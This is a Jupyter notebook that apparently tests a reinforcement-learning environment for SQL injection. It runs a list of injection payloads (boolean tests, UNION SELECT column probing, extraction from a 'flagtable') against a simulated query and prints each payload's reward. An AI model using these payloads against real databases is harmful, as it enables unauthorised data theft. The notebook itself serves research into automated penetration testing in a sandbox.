{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "0eec199f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "from IPython.display import clear_output, display\n",
    "from tqdm import tqdm\n",
    "import environment\n",
    "import gym\n",
    "import structured.generate_actions as gen_acts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "2a3a27c3",
   "metadata": {},
   "outputs": [],
   "source": [
    "env = gym.make('SQL-v1')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "6046f192",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "''"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "actions = gen_acts.generate_actions()\n",
    "env.reset()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "16e326de",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id, username FROM users WHERE id='1{input}'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1' and 1=1 --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1' and 1=2 --'\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id='1' union select NULL --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1' union select NULL, NULL --'\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id='1' union select NULL, NULL, NULL --'\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id='1' union select NULL, NULL, NULL, NULL --'\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id='1' union select NULL, NULL, NULL, NULL, NULL --'\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id='1' union select flag from flagtable --'\n",
      "99.9 |||| SELECT id, username FROM users WHERE id='1' union select flag, NULL from flagtable --'\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id='1' union select flag, NULL, NULL from flagtable --'\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id='1' union select flag, NULL, NULL, NULL from flagtable --'\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id='1' union select flag, NULL, NULL, NULL, NULL from flagtable --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1\" and 1=1 --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1\" and 1=2 --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1\" union select NULL --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1\" union select NULL, NULL --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1\" union select NULL, NULL, NULL --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1\" union select NULL, NULL, NULL, NULL --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1\" union select NULL, NULL, NULL, NULL, NULL --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1\" union select flag from flagtable --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1\" union select flag, NULL from flagtable --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1\" union select flag, NULL, NULL from flagtable --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1\" union select flag, NULL, NULL, NULL from flagtable --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1\" union select flag, NULL, NULL, NULL, NULL from flagtable --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1 and 1=1 --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1 and 1=2 --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1 union select NULL --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1 union select NULL, NULL --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1 union select NULL, NULL, NULL --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1 union select NULL, NULL, NULL, NULL --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1 union select NULL, NULL, NULL, NULL, NULL --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1 union select flag from flagtable --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1 union select flag, NULL from flagtable --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1 union select flag, NULL, NULL from flagtable --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1 union select flag, NULL, NULL, NULL from flagtable --'\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id='1 union select flag, NULL, NULL, NULL, NULL from flagtable --'\n"
     ]
    }
   ],
   "source": [
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    #print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "272659a0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id, username FROM users WHERE id=1{input}\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' and 1=1 --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' and 1=2 --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL, NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL, NULL, NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag, NULL, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag, NULL, NULL, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" and 1=1 --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" and 1=2 --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select NULL, NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select NULL, NULL, NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select flag from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select flag, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select flag, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select flag, NULL, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select flag, NULL, NULL, NULL, NULL from flagtable --\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id=1 and 1=1 --\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id=1 and 1=2 --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select NULL --\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id=1 union select NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select NULL, NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select NULL, NULL, NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select flag from flagtable --\n",
      "99.9 |||| SELECT id, username FROM users WHERE id=1 union select flag, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select flag, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select flag, NULL, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select flag, NULL, NULL, NULL, NULL from flagtable --\n"
     ]
    }
   ],
   "source": [
    "env.reset()\n",
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    #print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b8506bb9",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "71f23e11",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(1, 'admin', 'admin', 'admin', '78!', 'IT', '1994-11-02'),\n",
       " (2, 'dricci', 'dian', 'ricci', 12345, 'AI', '2021-02-02'),\n",
       " (3, 'amason', 'anthony', 'mason', 45, 'Middle earth', '1301-02-02'),\n",
       " (4, 'svargas', 'sandra', 'vargas', 19, 'Earth', '2040-01-01'),\n",
       " (5, '123', 'Bob', '123', 33, 'The island', '3011-01-01')]"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute(\"select * from users\")\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cf940caf",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
